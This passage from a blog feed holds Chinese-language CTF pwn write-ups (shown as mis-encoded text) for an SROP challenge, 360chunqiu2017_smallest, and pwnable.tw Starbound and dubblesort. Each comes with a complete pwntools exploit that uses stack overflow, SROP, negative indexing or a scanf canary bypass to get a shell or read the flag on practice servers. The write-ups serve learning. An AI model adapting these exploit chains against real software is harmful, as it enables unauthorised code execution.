<p>â€‹	è·³åˆ°åœ°å€ä¸º<code>0x401000</code>è¿™é‡Œï¼Œåˆ†ææ±‡ç¼–ä»£ç ï¼Œ<code>2</code>ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œ<code>write(1,buf,0x2a),read(0,rsp-0x40,0x400)</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909651.png" alt="image-20240206132903020"></p>
<p>â€‹	ç¨‹åºä¸­æ²¡æœ‰<code>/bin/sh</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆå¾€ä¸€ä¸ªåœ°å€ä¸­å†™å…¥<code>/bin/sh</code>ã€‚å¦‚æœæˆ‘ä»¬ç›´æ¥å†™å…¥<code>/bin/sh</code>å†<code>srop</code>ï¼Œæˆ‘ä»¬ä¸èƒ½çŸ¥é“<code>/bin/sh</code>çš„åœ°å€ï¼Œæ‰€ä»¥å¯ä»¥å…ˆæ ˆè¿ç§»åˆ°<code>data</code>æ®µï¼Œ<code>data</code>æ®µçš„åœ°å€å·²çŸ¥ä¸”ä¸å˜ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ‹¿åˆ°<code>/bin/sh</code>çš„åœ°å€äº†ï¼Œè®¾ç½®<code>read</code>çš„ä¸€äº›å¯„å­˜å™¨å€¼ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buf_addr = <span class="number">0x402000</span></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span>  <span class="comment">#readçš„ç³»ç»Ÿè°ƒç”¨å·</span></span><br><span class="line">frame.rdi = <span class="number">0</span>  <span class="comment">#æ ‡å‡†è¾“å…¥</span></span><br><span class="line">frame.rsi = buf_addr  <span class="comment">#å†™å…¥çš„ä½ç½®çš„èµ·å§‹åœ°å€</span></span><br><span class="line">frame.rdx = <span class="number">0x400</span>  <span class="comment">#å¯ä»¥å†™å…¥çš„å­—èŠ‚ä¸ªæ•°</span></span><br><span class="line">frame.rip = syscall_leave_ret  <span class="comment">#syscallç³»ç»Ÿè°ƒç”¨read</span></span><br><span class="line">frame.rbp = buf_addr+<span class="number">0x20</span></span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡è¿™é‡Œ<code>frame.rbp = buf_addr+0x20</code>çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿï¼‰</p>
<p>â€‹	ç„¶åæˆ‘ä»¬å¯ä»¥æ„é€ ç¬¬ä¸€ä¸ª<code>payload</code>å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line"><span class="comment"># srop to call read, set *data_addr = /bin/sh\x00</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Hey, can i get some feedback for the CTF?\n&quot;</span>, payload)</span><br></pre></td></tr></table></figure>

<p>â€‹	ä¸Šé¢æ„é€ çš„<code>signal frame</code>å†æ¬¡<code>syscall</code>äº†ä¸€ä¸ª<code>read</code>ç³»ç»Ÿè°ƒç”¨ï¼Œä¸‹é¢æˆ‘ä»¬å°±å¯ä»¥å¾€<code>buf_addr = 0x402000</code>é‡Œå†™å…¥<code>/bin/sh</code>ï¼Œå¹¶å†æ¬¡æ„é€ ä¸€ä¸ª<code>signal frame</code>ç³»ç»Ÿè°ƒç”¨<code>execve</code>ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span>  <span class="comment">#execveçš„ç³»ç»Ÿè°ƒç”¨å·</span></span><br><span class="line">frame.rdi = buf_addr  <span class="comment">#/bin/shçš„åœ°å€</span></span><br><span class="line">frame.rsi = <span class="number">0</span>  <span class="comment">#ç¬¬äºŒä¸ªå‚æ•°</span></span><br><span class="line">frame.rdx = <span class="number">0</span>  <span class="comment">#ç¬¬ä¸‰ä¸ªå‚æ•°</span></span><br><span class="line">frame.rip = syscall_leave_ret  <span class="comment">#</span></span><br><span class="line"><span class="comment">#frame.rbp =   #æ²¡æœ‰rbpäº†</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./srop&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26592</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">buf_addr = <span class="number">0x402000</span></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span> </span><br><span class="line">frame.rdi = <span class="number">0</span>  </span><br><span class="line">frame.rsi = buf_addr </span><br><span class="line">frame.rdx = <span class="number">0x400</span> </span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line">frame.rbp = buf_addr+<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Hey, can i get some feedback for the CTF?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span></span><br><span class="line">frame.rdi = buf_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909642.png" alt="image-20240206160012074"></p>
<h2 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a><code>360chunqiu2017_smallest</code></h2><h3 id="æ€è·¯-2"><a href="#æ€è·¯-2" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>æˆ‘ä»¬æ¯æ¬¡æ§åˆ¶å¯„å­˜å™¨çš„æ—¶å€™ï¼Œéƒ½æŠŠ<code>rsp</code>å†™æˆä¸‹ä¸€ä¸ªç‰‡æ®µçš„<code>rt_sigreturn</code>çš„åœ°å€ï¼Œå¹¶ä¸”<code>rip</code>çš„åœ°å€è¦æŒ‡å‘<code>syscallï¼›ret</code> ä¸€å®šè¦åé¢æœ‰<code>ret</code>ï¼Œä¸ç„¶æ‰€æœ‰çš„ç‰‡æ®µè¿ä¸èµ·æ¥ï¼Œåˆ°<code>ret</code>çš„æ—¶å€™ï¼Œå°±ä¼šå»æ‰§è¡Œ<code>rsp</code>æ‰§è¡Œçš„åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥ä¸€ç›´åŠ«æŒç¨‹åºçš„æ§åˆ¶æµã€‚</p>
<p>â€‹	ç¨‹åºå¾ˆç®€å•ï¼Œåªæœ‰ä¸‹é¢ä¸€ä¸ªå‡½æ•°ï¼Œåˆ†æä¸€ä¸‹ä»£ç å°±æ˜¯ä¸€ä¸ª<code>read</code>ç³»ç»Ÿè°ƒç”¨ï¼Œå¯ä»¥æ ˆæº¢å‡ºå¹¶ä¸”èƒ½å¤Ÿæº¢å‡ºçš„å­—èŠ‚æ•°å¾ˆé•¿ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sys_read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;retaddr, <span class="number">0x400</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909763.png" alt="image-20240207130130852"></p>
<p>â€‹	è¿™é“é¢˜æ—¢ç„¶æ˜¯ç”¨<code>srop</code>ï¼Œé‚£ä¹ˆå¿…ç„¶æ˜¯éœ€è¦èƒ½å¤Ÿè°ƒç”¨<code>sigreturn</code>ï¼Œä¹Ÿå°±æ˜¯éœ€è¦æŠŠ<code>rax</code>å¯„å­˜å™¨çš„å€¼è®¾ç½®ä¸º<code>0xf</code>ã€‚æˆ‘ä»¬å‘ç°å¹¶æ²¡æœ‰èƒ½å¤Ÿå®ç°è¿™ä¸ªçš„ç›¸å…³çš„<code>gadget</code>ï¼Œä½†æ˜¯æˆ‘ä»¬çªç„¶æƒ³åˆ°<code>read</code>è¿”å›å€¼å°±æ˜¯å­˜å‚¨åœ¨<code>rax</code>å¯„å­˜å™¨ä¸­çš„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥è®¾ç½®<code>rax</code>å¯„å­˜å™¨çš„å€¼ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">syscall_ret_addr = <span class="number">0x4000be</span></span><br><span class="line">start_addr = <span class="number">0x4000b0</span></span><br><span class="line">payload = p64(start_addr)*<span class="number">3</span></span><br><span class="line"><span class="comment">#ç¬¬ä¸€ä¸ªstartå»è®©ç¬¬ä¸€æ¬¡æ­£å¸¸è¿è¡Œçš„retè¿”å›åˆ°start</span></span><br><span class="line"><span class="comment">#ç¬¬äºŒä¸ªstartè®©\xB3è¾“å…¥è¿›æ¥ï¼Œæ­¤æ—¶å»æ”¹å˜äº†æ ˆé¡¶çš„startï¼Œæ­¤æ—¶å®ƒè·³è¿‡äº†xor rax,raxï¼Œå¹¶</span></span><br><span class="line"><span class="comment">#ä¸”å®ƒçš„ä¸‹é¢è¿˜æœ‰ä¸€ä¸ªstart</span></span><br><span class="line"><span class="comment">#æœ€ä¸‹é¢çš„startæ˜¯è®©æˆ‘ä»¬å¯ä»¥å†è¾“å…¥frameï¼Œä¸€ç›´æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">p.send(<span class="string">b&#x27;\xB3&#x27;</span>)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">leak_addr = u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">target_addr = leak_addr-<span class="number">0x2000</span><span class="comment">#å‡å»0x2000ï¼ŒæŠŠpayloadå†™åˆ°è¯¥åœ°å€</span></span><br></pre></td></tr></table></figure>

<p><code>exp</code>å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29210</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./smallest&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">syscall_ret_addr = <span class="number">0x4000be</span></span><br><span class="line">start_addr = <span class="number">0x4000b0</span></span><br><span class="line">payload = p64(start_addr)*<span class="number">3</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">p.send(<span class="string">b&#x27;\xB3&#x27;</span>)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">leak_addr = u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">target_addr = leak_addr-<span class="number">0x2000</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span>  </span><br><span class="line">frame.rdi = <span class="number">0</span>  </span><br><span class="line">frame.rsi = target_addr </span><br><span class="line">frame.rdx = <span class="number">0x400</span> </span><br><span class="line">frame.rip = syscall_ret_addr  </span><br><span class="line">frame.rsp = target_addr  </span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">payload = p64(syscall_ret_addr)+<span class="string">b&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">binsh_addr = target_addr+<span class="number">0x110</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span>  </span><br><span class="line">frame.rdi = binsh_addr  </span><br><span class="line">frame.rsi = <span class="number">0</span>  </span><br><span class="line">frame.rdx = <span class="number">0</span>  </span><br><span class="line">frame.rip = syscall_ret_addr</span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">bytes</span>(frame).ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">payload = p64(syscall_ret_addr)+<span class="string">b&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909062.png" alt="image-20240219151202950"></p>
]]></content>
      <categories>
        <category>pwnå­¦ä¹ æ€»ç»“</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>SROP</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw writeup-Starbound</title>
    <url>/2024/07/26/Starbound/</url>
    <content><![CDATA[<h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><h4 id="ç¡®å®šåç§»"><a href="#ç¡®å®šåç§»" class="headerlink" title="ç¡®å®šåç§»"></a>ç¡®å®šåç§»</h4><p>è¦åˆ©ç”¨<code>add    esp, 0x1c</code>ï¼Œå…ˆæŠŠè¯¥æŒ‡ä»¤çš„åœ°å€å†™åˆ°ä¸€ä¸ªåœ°å€ï¼Œå¦‚å›¾æ˜¯<code>0x80580d0</code>ï¼ŒåŒæ—¶ä¹Ÿè·å¾—äº†<code>/home/starbound/flag</code>çš„åœ°å€ï¼Œä¸º<code>0x80580d4</code></p>
<span id="more"></span>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202246246.png" alt="1"></p>
<p>æ•°ç»„*dword_8058154[v3]*çš„é¦–åœ°å€ä¸º<code>0x8058154</code>ï¼Œå¦‚å›¾</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202246757.png" alt="2" style="zoom:67%;" />

<p>è®¡ç®—<code>0x80580d0</code>åˆ°<code>0x8058154</code>çš„åç§»ï¼Œä¸º<code>0x84</code>ï¼Œæ•…ç´¢å¼•ä¸º<code>-33</code>ï¼Œå³<code>doword_8058154[-33]</code>ä¾¿æ˜¯<code>0x80580d0</code>çš„åœ°å€ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202246993.png" alt="3"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./starbound&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10202</span>)</span><br><span class="line">debug(p)</span><br><span class="line">elf = ELF(<span class="string">&quot;./starbound&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">payload1,payload2</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter your name: &quot;</span>,payload1)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,payload2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add    esp, 0x1c</span></span><br><span class="line"><span class="string">open(&quot;/home/starbound/flag&quot;,0)</span></span><br><span class="line"><span class="string">read(3,flag_addr,0x50)</span></span><br><span class="line"><span class="string">write(1,flag_addr,0x50)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add_esp_0x1c = <span class="number">0x08048e48</span></span><br><span class="line">file_addr = <span class="number">0x80580d4</span></span><br><span class="line">flag_addr = <span class="number">0x080580f0</span></span><br><span class="line">return_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload1 = p32(add_esp_0x1c)+<span class="string">b&#x27;/home/starbound/flag\x00&#x27;</span></span><br><span class="line">payload2 = <span class="string">b&#x27;-33\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(elf.plt[<span class="string">&#x27;open&#x27;</span>])+p32(return_addr)+p32(file_addr)+p32(<span class="number">0</span>)</span><br><span class="line">fun(payload1,payload2)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;-33\x00&#x27;</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span>+p32(elf.plt[<span class="string">&#x27;read&#x27;</span>])+p32(return_addr)+p32(<span class="number">3</span>)+p32(flag_addr)+p32(<span class="number">0x50</span>)</span><br><span class="line">fun(p32(add_esp_0x1c),payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;-33\x00&#x27;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">4</span>+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(return_addr)+p32(<span class="number">1</span>)+p32(flag_addr)+p32(<span class="number">0x50</span>)</span><br><span class="line">fun(p32(add_esp_0x1c),payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<em>flag</em></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202246405.png" alt="4"></p>
]]></content>
      <categories>
        <category>pwnable.twåˆ·é¢˜</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>æ ˆ</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw writeup-dubblsort</title>
    <url>/2024/07/17/dubblsort/</url>
    <content><![CDATA[<h3 id="å­¦ä¹ ä¸æ”¶è·"><a href="#å­¦ä¹ ä¸æ”¶è·" class="headerlink" title="å­¦ä¹ ä¸æ”¶è·"></a>å­¦ä¹ ä¸æ”¶è·</h3><p>å¯¹äº<code>scanf(&quot;%u&quot;,v4)</code>ï¼Œ<code>%u</code>è¡¨ç¤ºæ— ç¬¦å·æ•´æ•°</p>
<ul>
<li><p>å½“æˆ‘ä»¬è¾“å…¥æ•´æ•°æ—¶ï¼Œ<em>scanf</em>è®¤ä¸ºå…¶æ˜¯åˆæ³•å­—ç¬¦ï¼Œå¹¶å°†å…¶å†™åˆ°<em>v4</em>ä¸­ï¼›</p>
<span id="more"></span>
</li>
<li><p>å½“æˆ‘ä»¬è¾“å…¥å­—æ¯æ—¶ï¼Œ<em>scanf</em>è®¤ä¸ºå…¶æ˜¯éæ³•å­—ç¬¦ï¼Œå¹¶å°†å…¶ä¸€ç›´ç•™åœ¨ç¼“å†²åŒºï¼Œå¯¼è‡´æˆ‘ä»¬åé¢ä¸èƒ½å†ç»§ç»­è¾“å…¥æ•°æ®ï¼›</p>
</li>
<li><p>å½“æˆ‘ä»¬è¾“å…¥<code>+</code>æˆ–è€…<code>-</code>æ—¶ï¼Œ<em>scanf</em>ä¼šè®¤ä¸ºä»–æ˜¯åˆæ³•å­—ç¬¦ï¼ŒåŒæ—¶åˆä¸ä¼šå°†å…¶å†™åˆ°<em>v4</em>ä¸­ã€‚ï¼ˆå› ä¸º<code>+</code>å’Œ<code>-</code>ä¹Ÿå¯ä»¥ç”¨æ¥å®šä¹‰æ•°å­—çš„æ­£è´Ÿï¼Œæ‰€ä»¥<em>scanf</em>ä¼šè®¤ä¸ºå…¶æ˜¯åˆæ³•çš„ï¼‰</p>
</li>
</ul>
<p>æœ‰äº›æ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<em>scanf</em>çš„è¿™ä¸ªæ¼æ´ï¼Œè¾¾åˆ°ç»•è¿‡<em>canary</em>çš„ç›®çš„ã€‚</p>
<h3 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><p>ä¿æŠ¤ï¼š</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237211.png" alt="1"></p>
<p>ç¬¬ä¸€æ¬¡<em>read</em>å¾€<em>buf</em>å†™å…¥<code>0x40</code>ä¸ªå­—èŠ‚ï¼Œæ¥ç€è¾“å…¥ä¸€ä¸ªæ•´æ•°åˆ°<em>v8</em>ï¼Œç„¶åè¾“å…¥æ•°æ®åˆ°æ ˆä¸­ï¼Œè¿™ä¸ªè¿‡ç¨‹å¾ªç¯<em>v8</em>æ¬¡</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237767.png" alt="2"></p>
<h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>â€‹	åœ¨å¾ªç¯çš„è¿‡ç¨‹ä¸­ï¼Œæ¯å¾ªç¯ä¸€æ¬¡ï¼Œå¾€æ ˆä¸Šè¾“å…¥æ•°æ®çš„ä½ç½®å°±<code>+1</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è¦†ç›–è¿”å›åœ°å€ï¼Œä½†æ˜¯åŒæ—¶ä¹Ÿä¼šè¦†ç›–<em>canary</em>ã€‚è€Œæˆ‘ä»¬åˆæ²¡åŠæ³•æ³„æ¼<em>canary</em>ï¼Œé‚£èƒ½ä¸èƒ½ç»•è¿‡ä¿®æ”¹<em>canary</em>çš„è¿™ä¸€æ¬¡å¾ªç¯å‘¢ï¼Ÿ</p>
<p>å¯¹äº<code>scanf(&quot;%u&quot;,v4)</code>ï¼Œ</p>
<ul>
<li>å½“æˆ‘ä»¬è¾“å…¥æ•´æ•°æ—¶ï¼Œ<em>scanf</em>è®¤ä¸ºå…¶æ˜¯åˆæ³•å­—ç¬¦ï¼Œå¹¶å°†å…¶å†™åˆ°<em>v4</em>ä¸­ï¼›</li>
<li>å½“æˆ‘ä»¬è¾“å…¥å­—æ¯æ—¶ï¼Œ<em>scanf</em>è®¤ä¸ºå…¶æ˜¯éæ³•å­—ç¬¦ï¼Œå¹¶å°†å…¶ä¸€ç›´ç•™åœ¨ç¼“å†²åŒºï¼Œå¯¼è‡´æˆ‘ä»¬åé¢ä¸èƒ½å†ç»§ç»­è¾“å…¥æ•°æ®ï¼›</li>
<li>å½“æˆ‘ä»¬è¾“å…¥<code>+</code>æˆ–è€…<code>-</code>æ—¶ï¼Œ<em>scanf</em>ä¼šè®¤ä¸ºä»–æ˜¯åˆæ³•å­—ç¬¦ï¼ŒåŒæ—¶åˆä¸ä¼šå°†å…¶å†™åˆ°<em>v4</em>ä¸­ã€‚ï¼ˆå› ä¸º<code>+</code>å’Œ<code>-</code>ä¹Ÿå¯ä»¥ç”¨æ¥å®šä¹‰æ•°å­—çš„æ­£è´Ÿï¼Œæ‰€ä»¥<em>scanf</em>ä¼šè®¤ä¸ºå…¶æ˜¯åˆæ³•çš„ï¼‰</li>
</ul>
<p>â€‹	ä¹Ÿå°±æ˜¯è¯´ï¼Œå‡å¦‚<em>i&#x3D;11</em>æ—¶ï¼Œæˆ‘ä»¬è¯¥å†™å…¥åˆ°<em>canary</em>è¿™ä¸ªä½ç½®ï¼Œæ­¤æ—¶å¦‚æœè¾“å…¥<code>+</code>ï¼Œä¾¿èƒ½æˆåŠŸç»•è¿‡<em>canary</em>ã€‚ç„¶å<em>i</em>ä¹ŸæˆåŠŸ<code>+1</code>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ç›´æ¥è¦†ç›–è¿”å›å¯¼è‡´å³å¯ã€‚</p>
<p>æ•´ä½“æ€è·¯å¦‚ä¸‹ï¼Œ</p>
<ol>
<li>è®¡ç®—åç§»é‡ï¼Œæ³„æ¼ä¸€ä¸ª<em>libc</em>åœ°å€ï¼Œç®—å‡º<em>libc</em>åŸºåœ°å€</li>
<li>ç»•è¿‡<em>canary</em>ï¼Œè¦†ç›–è¿”å›åœ°å€</li>
</ol>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./dubblesort&#x27;)</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10101</span>)</span><br><span class="line">debug(p)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;What your name :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">28</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">28</span>)</span><br><span class="line">leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log_addr(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">libc_base = leak-<span class="number">0x1b000a</span>   <span class="comment">#æœ¬åœ°çš„offsetæ˜¯0x1840a</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;sort :&quot;</span>,<span class="built_in">str</span>(<span class="number">35</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;number : &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;number : &quot;</span>,<span class="built_in">str</span>(system))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<em>flag</em></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237403.png" alt="3"></p>
]]></content>
      <categories>
        <category>pwnable.twåˆ·é¢˜</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>æ ˆ</tag>
      </tags>
  </entry>
  <entry>
    <title>gitæ—¶å‡ºç°â€œPlease make sure you have the correct access rights and the repository exists.â€</title>
    <url>/2024/09/08/git%E6%97%B6%E5%87%BA%E7%8E%B0%E2%80%9CPlease-make-sure-you-have-the-correct-access-rights-and-the-repository-exists-%E2%80%9D/</url>
